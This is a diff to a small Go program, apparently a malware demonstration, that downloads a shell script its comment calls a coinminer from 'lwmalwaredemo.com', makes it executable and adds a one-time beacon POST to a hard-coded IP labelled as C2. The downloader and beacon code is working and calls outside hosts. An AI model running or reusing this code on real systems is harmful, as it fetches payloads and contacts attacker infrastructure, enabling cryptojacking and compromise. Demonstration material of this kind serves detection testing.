@@ -1,12 +1,29 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"io"
 	"net/http"
 	"os"
 	"time"
 )
+
+func http_post(url string, jsonStr []byte) error {
+
+        req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
+        req.Header.Set("X-Custom-Header", "myvalue")
+        req.Header.Set("Content-Type", "application/json")
+
+        client := &http.Client{}
+        resp, err := client.Do(req)
+        if err != nil {
+                return err
+        }
+        defer resp.Body.Close()
+
+        return err
+}
 
 func http_get(url string, filename string) error {
 
@@ -30,16 +47,15 @@ func main() {
 
 	// define constants
 	const domain = "lwmalwaredemo.com"
-	const filename = "install-demo-1.sh"	
+	const filename = "install-demo-1.sh"
+	const ip = "54.184.116.123"
 
-        //wait a few seconds
-        time.Sleep(3 * time.Second)
+	var post_url = "http://"+ip+"/lw-beacon"
+	var get_url = "http://"+domain+"/"+filename
+	var body = []byte(`{"stage":"2"}`)
 
 	// download coinminer script
-	get_url := fmt.Sprintf("http://%s/%s", domain, filename)
-
-	fmt.Println(get_url)
-
+	fmt.Println("Downloading file: "+get_url)
 	get_err := http_get(get_url, filename)
 	if get_err != nil {
 		panic(get_err)
@@ -50,8 +66,15 @@ func main() {
 	if chmod_err != nil {
 		panic(chmod_err)
 	}
+	fmt.Println("Done")
+
+	//beacon to C2 once
+	fmt.Println("Beaconing to C2 once...")
+	post_err := http_post(post_url, body)
+	if post_err != nil {
+	panic(post_err)
+	}
 
         //wait a few seconds then terminate
         time.Sleep(10 * time.Second)
-
 }
